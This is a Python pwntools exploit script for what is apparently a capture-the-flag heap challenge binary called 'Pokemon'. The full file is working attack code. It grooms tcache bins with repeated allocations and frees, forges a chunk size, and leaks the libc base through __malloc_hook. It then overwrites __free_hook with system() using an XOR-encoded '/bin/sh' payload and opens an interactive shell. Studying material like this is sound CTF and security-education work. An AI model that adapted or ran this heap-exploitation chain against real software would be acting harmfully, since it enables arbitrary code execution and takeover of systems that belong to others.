from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('Pokemon')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc.so.6')
elf = ELF('Pokemon')


def add(Type, size = 0, site = 0):
    io.sendlineafter('Choice: ', '1')
    io.sendlineafter('Choice: ', str(Type))
    if Type == 1:
        io.sendlineafter('How big do you want it to be?\n', str(size))
    io.sendlineafter(' do you want to save it? [0/1]\n', str(site))


def delete(site, Type = 1):
    io.sendlineafter('Choice: ', '2')
    io.sendlineafter(' do you want to choose? [0/1]', str(site))
    io.sendlineafter('Choice: ', '1')
    if Type != 1:
        io.sendlineafter('Are you sure you want to release it? [Y/N]\n', 'Y')
        

def show(site):
    io.sendlineafter('Choice: ', '2')
    io.sendlineafter(' do you want to choose? [0/1]', str(site))
    io.sendlineafter('Choice: ', '2')
    io.recvuntil('Psyduck say: ')
    return io.recvn(8)


def edit(payload, site = 0, Type = 2):
    io.sendlineafter('Choice: ', '2')
    io.sendlineafter(' do you want to choose? [0/1]', str(site))
    io.sendlineafter('Choice: ', '3')
    if Type == 2:
        for _ in range(16):
            io.send(p64(0xdeadbeef) * 2)
        io.send(payload)
    else:
        io.sendafter('You say: ', payload)


def challenge(site):
    io.sendlineafter('Choice: ', '3')
    io.sendlineafter('[0/1]\n', str(site))


def xor_str(a, b):
    res = b''
    for i in range(len(a)):
        res += p8(a[i] ^ b[i%8])
    return res


def pwn():
    io.sendlineafter('Welcome to the Pokemon world, input your name: \n', 'payoung')
    for _ in range(7):
        add(1, 0x220)
        delete(0)
        add(1, 0x300)
        delete(0)
        add(1, 0x310)
        delete(0)
    add(1, 0x220)
    add(1, 0x300, 1)
    delete(0)
    add(1, 0x300, 0)
    for _ in range(5):
        add(1, 0x300, 1)
    delete(0)
    add(2)
    payload = p64(0) + p64(0x1261)
    edit(payload)
    delete(0, 2)
    delete(1)
    add(1, 0x300, 0)
    add(1, 0x300, 1)
    delete(1)
    challenge(1)
    add(1, 0x310, 1)
    io.sendlineafter('Choice: ', '3')
    io.recvuntil('gem: ')
    libc_base = u64(io.recvn(8)) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))
    io.sendlineafter('[Y/N]\n', 'N')
    delete(1)
    add(1, 0x300, 0)
    add(3, 0, 1)
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    payload = p8(0xaa) * 8 + p64(__free_hook - 8) + b'\n'
    edit(payload, 1, 3)

    io.sendlineafter('Choice: ', '3')
    io.sendlineafter('[Y/N]\n', 'Y')
    payload = b'/bin/sh\x00' + p64(system)
    io.sendlineafter('Please give the evolution password: ', xor_str(payload, p8(0xaa) * 8))
    # gdb.attach(io)
    delete(0)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()
